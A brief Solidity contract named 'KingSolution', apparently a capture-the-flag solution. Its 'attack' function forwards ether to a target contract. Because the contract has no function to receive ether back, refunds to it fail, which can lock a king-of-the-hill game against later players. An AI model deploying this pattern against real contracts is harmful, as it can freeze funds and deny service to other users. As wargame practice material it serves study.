pragma solidity ^0.6.0;

contract KingSolution {
function attack(address payable _to) external payable returns(bool){
(bool sent,) = _to.call{value: msg.value}("");
return sent;
}
}
